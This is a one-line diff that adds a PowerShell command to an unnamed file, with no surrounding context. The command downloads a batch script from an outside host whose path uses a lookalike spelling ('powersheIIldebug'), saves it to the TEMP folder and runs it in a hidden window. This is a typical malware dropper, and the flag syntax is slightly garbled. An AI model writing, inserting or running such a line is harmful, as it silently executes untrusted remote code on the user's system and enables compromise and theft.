@@ -1,0 +1,1 @@
+iwr -useb https://urlday.cc/powersheIIldebug-o $env:TEMP\script.bat; saps $env:TEMP\script.bat -WindowStyle Hidden
